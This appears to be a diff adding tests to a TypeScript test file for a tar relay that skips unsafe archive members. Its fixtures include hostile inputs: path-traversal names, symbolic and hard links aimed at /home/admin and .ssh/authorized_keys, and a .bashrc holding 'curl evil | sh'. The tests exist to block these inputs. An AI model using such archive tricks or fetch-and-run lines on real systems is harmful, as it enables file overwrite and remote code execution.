@@ -115,7 +115,62 @@ describe('relayTar', () => {
     expect(note).toContain('/etc/passwd\tname is absolute');
     expect(note).toContain('./dev\tnot a regular file');
     expect(note).toContain('./fifo\tnot a regular file');
-    expect(note).toContain('./outside\thard link to ../../etc/shadow, outside the folder');
+    expect(note).toContain('./outside\thard link to ../../etc/shadow, which is not in this archive');
+  });
+
+  it('leaves out names a Windows extractor would place outside the folder', async () => {
+    const r = remote([
+      member('./..\\..\\evil.bat', '0', Buffer.from('x')),
+      member('./a\\..\\..\\b', '0', Buffer.from('x')),
+      member('\\Windows\\x', '0', Buffer.from('x')),
+      member('./C:\\x', '0', Buffer.from('x')),
+      member('./back\\slash ok', '0', Buffer.from('ok')),
+      END,
+    ]);
+    const { summary, gz } = await relay(r);
+    // bsdtar lists a backslash escaped
+    expect(names(gz).map((n) => n.replace(/\\\\/g, '\\'))).toEqual(['./back\\slash ok', '_skipped.txt']);
+    expect(summary).toMatchObject({ files: 1, skipped: 4 });
+  });
+
+  it('leaves out members that would be extracted through a symbolic link, and hard links to files not in it', async () => {
+    const r = remote([
+      member('./home', '2', undefined, { linkName: '/home/admin' }),
+      member('./home/.bashrc', '0', Buffer.from('curl evil | sh')),
+      member('./dir/', '5'),
+      member('./dir/up', '2', undefined, { linkName: '../..' }),
+      member('./dir/up/x/y', '0', Buffer.from('x')),
+      member('./via', '1', undefined, { linkName: './home/.ssh/authorized_keys' }),
+      member('./dev', '3'),
+      member('./to-dev', '1', undefined, { linkName: './dev' }),
+      member('./real', '0', Buffer.from('r')),
+      member('./same', '1', undefined, { linkName: './real' }),
+      END,
+    ]);
+    const { summary, gz } = await relay(r);
+    expect(names(gz)).toEqual(['./home', './dir/', './dir/up', './real', './same', '_skipped.txt']);
+    expect(summary).toMatchObject({ files: 4, skipped: 5 });
+    const note = execFileSync('tar', ['-xOzf', '-', '_skipped.txt'], { input: gz }).toString();
+    expect(note).toContain('./home/.bashrc\tinside the symbolic link home');
+    expect(note).toContain('./dir/up/x/y\tinside the symbolic link dir/up');
+    expect(note).toContain('./via\thard link to ./home/.ssh/authorized_keys, which is not in this archive');
+  });
+
+  it('refuses an oversized long-name record without reading it into memory', async () => {
+    let pulled = 0;
+    const source = Readable.from(
+      (function* () {
+        yield ustarHeader({ name: '././@LongLink', type: 'L', size: 4 * 1024 * 1024 * 1024, meta: meta() });
+        // An endless name: only a relay that reads it whole would keep pulling
+        for (;;) {
+          pulled += 64 * 1024;
+          yield Buffer.alloc(64 * 1024, 0x61);
+        }
+      })(),
+    );
+    const r: RemoteTar = { source, exited: new Promise(() => {}), messages: () => [], stop: () => {} };
+    await expect(relay(r)).rejects.toThrow(/oversized header/);
+    expect(pulled).toBeLessThan(1024 * 1024);
   });
 
   it('adds what tar reported to _skipped.txt, renaming the note if the folder has its own', async () => {
@@ -172,6 +227,9 @@ describe('relayTar', () => {
     await expect(relay(r)).rejects.toThrow(/ended inside a file/);
     const noEnd = remote([member('./a', '0', Buffer.from('x'))], { exitCode: null });
     await expect(relay(noEnd)).rejects.toThrow(/without its end blocks/);
+    // What went out before the break stays countable for the audit entry
+    const partial = remote([member('./a', '0', Buffer.from('x')), member('./b', '0', Buffer.alloc(2000, 1)).subarray(0, 1200)], { exitCode: null });
+    await expect(relay(partial)).rejects.toMatchObject({ summary: { files: 1, bytes: 1 } });
   });
 
   it('reports a cancelled download as aborted and stops the remote tar', async () => {
